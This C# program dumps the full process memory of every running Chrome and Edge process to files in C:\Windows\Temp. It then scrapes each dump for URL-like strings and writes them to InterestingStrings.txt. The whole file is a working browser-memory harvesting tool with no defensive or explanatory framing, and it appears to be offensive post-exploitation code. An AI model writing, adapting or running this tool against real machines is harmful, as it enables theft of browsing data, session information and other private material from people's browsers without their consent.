using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Reflection;
using System.Reflection.Metadata;
using Microsoft.Win32.SafeHandles;
using System.Text;
static class myProcessEx
{  

    [DllImport("Dbghelp.dll")]
    static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    static extern uint GetCurrentProcessId();

    [DllImport("kernel32.dll")]
    static extern uint GetCurrentThreadId();

    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    public struct MINIDUMP_EXCEPTION_INFORMATION
    {
        public uint ThreadId;
        public IntPtr ExceptionPointers;
        public int ClientPointers;
    }

     private static readonly int MiniDumpWithFullMemory = 0x00000002;

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
        ProcessAccessFlags processAccess,
        bool bInheritHandle,
        int processId
    );
    public static IntPtr OpenProcess(Process proc, ProcessAccessFlags flags)
    {
        return OpenProcess(flags, false, proc.Id);
    }
    public enum ProcessAccessFlags : uint
    {
        All = 0x001F0FFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VirtualMemoryOperation = 0x00000008,
        VirtualMemoryRead = 0x00000010,
        VirtualMemoryWrite = 0x00000020,
        DuplicateHandle = 0x00000040,
        CreateProcess = 0x000000080,
        SetQuota = 0x00000100,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        QueryLimitedInformation = 0x00001000,
        Synchronize = 0x00100000
    }
    

    static void Main()
    {
        Process[] processes = Process.GetProcesses();

        foreach (Process p in processes)
            {
            if (p.ProcessName == "chrome" || p.ProcessName == "msedge")
            {

            string dumpFileName = @"C:\\Windows\\Temp\dump" + p.ProcessName + "_" + p.Id  + "_" + DateTime.Now.ToString("dd.MM.yyyy.HH.mm.ss") + ".dmp";
            FileStream file = new FileStream(dumpFileName, FileMode.Create);
            IntPtr hProcess = IntPtr.Zero;
            hProcess = OpenProcess((ProcessAccessFlags)(0x0400 | 0x0010), false, (int)p.Id);

            MiniDumpWriteDump( hProcess , (uint)p.Id, file.SafeFileHandle.DangerousGetHandle(), MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            file.Close();

            byte[] buffer = File.ReadAllBytes(dumpFileName);
            StringBuilder sb = new StringBuilder();

            foreach (byte b in buffer)
                {
                    if (b >= 32 && b <= 126)
                    {        
                    sb.Append((char)b);
                    } 
                    else
                    {
                        if (sb.Length >= 6)
                        {
                            string test;
                            test = sb.ToString();
                            if (test.Contains("comhttps ") || test.Contains("nethttps ") || test.Contains("orghttps "))
                            {
                                Console.WriteLine(test);
                                string interestingStringsDump = @"C:\\Windows\Temp\InterestingStrings.txt";   
                                using (FileStream file2 = new FileStream(interestingStringsDump, FileMode.Append))
                                {
                                    byte[] data = System.Text.Encoding.UTF8.GetBytes(test + Environment.NewLine);
                                    file2.Write(data, 0, data.Length);
                                }
                            }
                        }
                        sb.Clear();
                    }
                }
            string exename = Path.GetFileName(dumpFileName);
            Console.WriteLine("Memory dumps saved to " + exename);

            Console.WriteLine("PID: {0} NAME {1}", p.Id, p.ProcessName);
            }
    }
}
}
